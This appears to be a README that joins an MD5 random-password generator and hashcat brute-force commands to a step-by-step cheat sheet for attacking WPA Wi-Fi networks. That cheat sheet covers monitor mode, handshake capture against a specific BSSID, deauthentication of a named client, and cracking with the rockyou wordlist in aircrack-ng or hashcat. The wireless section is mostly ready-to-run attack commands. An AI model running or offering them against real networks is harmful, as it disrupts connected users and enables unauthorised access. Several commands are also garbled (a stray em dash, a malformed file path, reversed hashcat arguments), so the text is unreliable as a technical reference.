# Cryptography
Cryptography is a method of protecting information and communications through the use of codes so that only those for whom the information is intended can read and process it. The pre-fix "crypt" means "hidden" or "vault" and the suffix "graphy" stands for "writing."

# random-md5-generator 
creating a random password with md5sum encryption and then save the encrypted password in md5keys.txt

# How to use 
./random-md5-generator

Genateted Number:

879076701

-----------------------

Number to md5 Password:

82fc843ab6a4c1767572f75775800ae8  -


delete the  - from the file md5keys.txt

# crack with

hashcat -m 0 -a 3  md5keys.txt ?d?d?d?d?d?d?d?d


# then use 

hashcat -m 0 -a 3  md5keys.txt ?d?d?d?d?d?d?d?d --show 

or 

hashcat -m 0 -a 3  md5keys.txt ?d?d?d?d?d?d?d?d --show >> md5keys.txt

to see the unencypt keys 


# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 — bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

# crack password with aircrack-ng… ########### download 134MB rockyou.txt dictionary file if needed
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## or crack password with hashcat ##########
# convert cap to hccapx
cap2hccapx.bin .-01.cap example.hccapx

# crack with hashcat
hashcat -w 3 -m 2500 rockyou.txt example.hccapx  --force --self-test-disable
